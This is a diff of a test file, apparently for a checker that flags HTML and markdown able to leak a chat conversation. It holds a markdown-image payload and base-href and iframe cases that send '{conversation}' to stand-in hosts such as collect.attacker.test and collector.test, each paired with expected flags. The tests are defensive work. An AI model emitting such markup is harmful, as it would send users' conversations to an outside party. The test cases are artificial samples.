@@ -700,6 +700,18 @@ EXFIL_IMAGE = "![status](https://collect.attacker.test/p.png?d={conversation})"
         ("<base href='https://0x7f.1/'><img src='/a.png'>", ["uncheckable_markup"]),
         ("<base href='https://127.0.0.1./'><img src='/a.png'>", []),
         ("<base href='https://example.1x/'><img src='/a.png'>", []),
+        (
+            (
+                "<base href='//collector.test/?q={c}'>"
+                "<iframe srcdoc='&lt;base href=&quot;//safe test/&quot;&gt;&lt;a href=&quot;&quot;&gt;x&lt;/a&gt;'>"
+                "</iframe>"
+            ),
+            ["uncheckable_markup"],
+        ),
+        ("<base href='//docs.test/'><a href='/guide'>x</a>", []),
+        ("<base href='https://collector.test/?q={conversation}'><a href='?'>Reset</a>", []),
+        ("<base href='https://collector.test/?q={conversation}'><a href='?#done'>Reset</a>", []),
+        ("<base href='https://collector.test/?q={conversation}'><a href='#done'>Top</a>", ["exfiltration_query"]),
         ("<base href='https://Docs.Example-1.test:8443/'><img src='/a.png'>", []),
         ("<base href='https://user@[2001:db8::1]:8443/'><img src='/a.png'>", []),
         (
